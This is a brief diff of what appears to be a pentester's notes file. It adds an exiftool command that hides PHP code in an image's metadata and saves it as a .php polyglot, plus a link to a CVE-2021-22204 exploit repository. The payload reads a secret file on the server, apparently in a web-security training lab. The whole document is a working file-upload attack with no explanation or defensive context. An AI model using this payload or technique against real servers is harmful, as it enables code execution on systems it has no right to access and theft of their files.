@@ -1,1 +1,8 @@
+#!/usr/bin/peno
+
+
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+#Exiftool CVE
+https://github.com/AssassinUKG/CVE-2021-22204
+
